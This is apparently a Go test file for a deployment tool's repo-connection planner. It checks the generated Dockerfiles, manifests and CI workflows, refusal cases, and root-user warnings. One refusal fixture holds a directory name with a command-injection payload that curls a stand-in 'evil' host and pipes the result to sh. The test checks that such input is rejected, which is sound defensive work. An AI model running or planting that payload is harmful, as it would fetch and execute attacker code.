package connect

import (
	"errors"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"github.com/showmino/forge/internal/manifest"
)

// repo is a repo's files: path to content ("" for a file whose content does
// not matter).
type repo map[string]string

func (r repo) input() Input {
	paths := make([]string, 0, len(r))
	for p := range r {
		paths = append(paths, p)
	}
	return Input{
		Service: "tool", Team: "web", Owners: []string{"ana@example.com"},
		Owner: "my-org", RepoURL: "https://github.com/my-org/tool",
		Registry: "ghcr.io", Runner: "ubuntu-latest", DeployRunner: "lan",
		Paths: paths,
		Read: func(p string) ([]byte, error) {
			c, ok := r[p]
			if !ok {
				return nil, errors.New("no " + p)
			}
			return []byte(c), nil
		},
	}
}

func files(t *testing.T, out *Result) map[string]string {
	t.Helper()
	m := map[string]string{}
	for _, f := range out.Files {
		m[f.Path] = string(f.Content)
	}
	return m
}

func TestPlanWithADockerfile(t *testing.T) {
	t.Parallel()
	in := repo{"Dockerfile": "FROM scratch", "main.go": ""}.input()
	in.Port, in.Health = 9090, "/ready"
	out, err := Plan(in)
	if err != nil {
		t.Fatal(err)
	}
	if out.Language != "" {
		t.Errorf("language %q for a repo with its own Dockerfile", out.Language)
	}
	f := files(t, out)
	if _, ok := f["Dockerfile"]; ok {
		t.Error("a Dockerfile was proposed over the repo's own")
	}
	if len(f) != 3 {
		t.Errorf("files: %v", out.Files)
	}
	// forge.yaml is valid and names what it should.
	m, err := manifest.Parse([]byte(f["forge.yaml"]))
	if err != nil {
		t.Fatalf("forge.yaml: %v\n%s", err, f["forge.yaml"])
	}
	if m.Service.Name != "tool" || m.Service.Team != "web" || m.Service.Repo != "https://github.com/my-org/tool" || m.RunPort() != 9090 || m.RunHealth() != "/ready" ||
		len(m.Service.Owners) != 1 {
		t.Errorf("forge.yaml: %+v %+v", m.Service, m.Run)
	}
	// The workflow builds the image Forge waits for, and deploys main from the runner that reaches the API.
	w := f[".github/workflows/forge.yml"]
	for _, want := range []string{
		"image=ghcr.io/my-org/tool:${SHA::7}",
		"runs-on: ubuntu-latest",
		"runs-on: lan",
		"id-token: write",
		"FORGE_API_URL: ${{ vars.FORGE_API_URL }}",
		`deploy start --env staging`,
		"password: ${{ secrets.GITHUB_TOKEN }}",
		"github.event.pull_request.head.repo.full_name == github.repository",
	} {
		if !strings.Contains(w, want) {
			t.Errorf("forge.yml has no %q:\n%s", want, w)
		}
	}
	for _, p := range []string{".github/workflows/forge.yml", ".github/workflows/forge-release.yml"} {
		var doc map[string]any
		if err := yaml.Unmarshal([]byte(f[p]), &doc); err != nil || doc["jobs"] == nil {
			t.Errorf("%s is not a workflow: %v", p, err)
		}
	}
	if r := f[".github/workflows/forge-release.yml"]; !strings.Contains(r, `docker buildx imagetools create --tag "$image:$GITHUB_REF_NAME" "$image:${GITHUB_SHA::7}"`) ||
		!strings.Contains(r, "image=ghcr.io/my-org/tool\n") {
		t.Errorf("forge-release.yml:\n%s", r)
	}
}

// Another registry logs in with the repo's secrets, and the image's owner is
// the org in lower case, as forge-api looks for it.
func TestPlanOtherRegistry(t *testing.T) {
	t.Parallel()
	in := repo{"Dockerfile": ""}.input()
	in.Owner, in.Registry = "My-Org", "acme.azurecr.io"
	out, err := Plan(in)
	if err != nil {
		t.Fatal(err)
	}
	w := files(t, out)[".github/workflows/forge.yml"]
	if !strings.Contains(w, "image=acme.azurecr.io/my-org/tool:${SHA::7}") || !strings.Contains(w, "secrets.FORGE_REGISTRY_PASSWORD") || strings.Contains(w, "GITHUB_TOKEN") {
		t.Errorf("forge.yml:\n%s", w)
	}
	if !out.RegistrySecrets {
		t.Error("the plan does not say it needs registry secrets")
	}
}

func TestPlanFindsTheLanguage(t *testing.T) {
	t.Parallel()
	for _, tc := range []struct {
		name string
		repo repo
		lang string
		want []string // in the Dockerfile
	}{
		{"go at the root", repo{"go.mod": "module x\n\ngo 1.23.4\n", "main.go": ""}, "go",
			[]string{"FROM mirror.gcr.io/library/golang:1.23 AS build", "go build -trimpath -ldflags \"-s -w\" -o /out/app .\n", "USER 65532:65532", "distroless/static"}},
		{"go under cmd", repo{"go.mod": "module x\ngo 1.25\n", "cmd/tool/main.go": "", "cmd/other/main.go": ""}, "go",
			[]string{"golang:1.25", "-o /out/app ./cmd/tool\n"}},
		{"go, one command", repo{"go.mod": "module x\n", "cmd/server/main.go": ""}, "go",
			[]string{"golang:1.24", "-o /out/app ./cmd/server\n"}},
		{"node with a lockfile", repo{"package.json": `{"scripts":{"build":"tsc","start":"node dist/index.js"}}`, "package-lock.json": ""}, "node",
			[]string{"RUN npm ci", "RUN npm run build", `CMD ["npm", "start"]`, "USER 1000:1000", "HOME=/tmp"}},
		{"node, plain", repo{"package.json": `{"main":"server.js"}`}, "node",
			[]string{"RUN npm install", `CMD ["node", "server.js"]`}},
		{"python", repo{"requirements.txt": "flask\n", "app.py": ""}, "python",
			[]string{"python:3.13-slim", "pip install --no-cache-dir -r requirements.txt", `CMD ["python", "app.py"]`, "USER 1000:1000", "PYTHONDONTWRITEBYTECODE=1"}},
		{"python project", repo{"pyproject.toml": "", "main.py": ""}, "python",
			[]string{"pip install --no-cache-dir .", `CMD ["python", "main.py"]`}},
	} {
		out, err := Plan(tc.repo.input())
		if err != nil {
			t.Errorf("%s: %v", tc.name, err)
			continue
		}
		d := files(t, out)["Dockerfile"]
		if out.Language != tc.lang {
			t.Errorf("%s: language %q, want %q", tc.name, out.Language, tc.lang)
		}
		for _, w := range tc.want {
			if !strings.Contains(d, w) {
				t.Errorf("%s: no %q in\n%s", tc.name, w, d)
			}
		}
	}
}

// Next.js writes its cache at run time: it gets a writable folder.
func TestPlanNextWritesItsCache(t *testing.T) {
	t.Parallel()
	out, err := Plan(repo{"package.json": `{"scripts":{"build":"next build","start":"next start"},"dependencies":{"next":"16"}}`}.input())
	if err != nil {
		t.Fatal(err)
	}
	m, err := manifest.Parse([]byte(files(t, out)["forge.yaml"]))
	if err != nil || m.Run == nil || strings.Join(m.Run.Writable, ",") != "/app/.next/cache" {
		t.Errorf("forge.yaml: %+v %v", m, err)
	}
}

func TestPlanRefuses(t *testing.T) {
	t.Parallel()
	for name, r := range map[string]repo{
		"nothing it knows":            {"README.md": ""},
		"go without a main":           {"go.mod": "module x\n", "lib.go": ""},
		"go with several commands":    {"go.mod": "module x\n", "cmd/a/main.go": "", "cmd/b/main.go": ""},
		"a command named to inject":   {"go.mod": "module x\n", "cmd/x$(curl${IFS}evil|sh)/main.go": ""},
		"python without an entry":     {"requirements.txt": ""},
		"node without a way to start": {"package.json": `{}`},
		"node with bad json":          {"package.json": `{`},
	} {
		if _, err := Plan(r.input()); !errors.Is(err, ErrNoDockerfile) {
			t.Errorf("%s: %v, want ErrNoDockerfile", name, err)
		}
	}
	for name, r := range map[string]repo{
		"a forge.yaml":     {"Dockerfile": "", "forge.yaml": ""},
		"forge's workflow": {"Dockerfile": "", ".github/workflows/forge.yml": ""},
	} {
		if _, err := Plan(r.input()); !errors.Is(err, ErrConnected) {
			t.Errorf("%s: %v, want ErrConnected", name, err)
		}
	}
}

// The repo's own Dockerfile is read for the user its last stage runs as:
// Forge runs every service as a non-root user, so a root one gets a note.
func TestPlanNotesTheDockerfilesUser(t *testing.T) {
	t.Parallel()
	for docker, want := range map[string]string{
		"FROM golang AS build\nUSER 1000\nFROM scratch\n":                 "sets no USER",
		"FROM alpine\nUSER root\n":                                        "runs as root",
		"FROM alpine\nUSER 0:0 # root\n":                                  "runs as root",
		"FROM node:24\nUSER node\n":                                       `user "node", a name`,
		"FROM alpine\nUSER 65532:65532\n":                                 "",
		"FROM gcr.io/distroless/static:nonroot\nCOPY app /\nUSER 65532\n": "",
		"from alpine\nuser 1000 \n":                                       "",
		"FROM alpine\nARG UID=1000\nUSER ${UID}\n":                        "",
		"FROM alpine\nUSER \\\n  1000\n":                                  "",
		"FROM alpine\nUSER 00\n":                                          "runs as root",
	} {
		out, err := Plan(repo{"Dockerfile": docker}.input())
		if err != nil {
			t.Fatal(err)
		}
		if (want == "") != (out.UserNote == "") || !strings.Contains(out.UserNote, want) {
			t.Errorf("%q: note %q, want %q", docker, out.UserNote, want)
		}
	}
	// A proposed Dockerfile is non-root already: no note.
	if out, _ := Plan(repo{"go.mod": "module x\n", "main.go": ""}.input()); out.UserNote != "" {
		t.Errorf("proposed Dockerfile: %q", out.UserNote)
	}
}
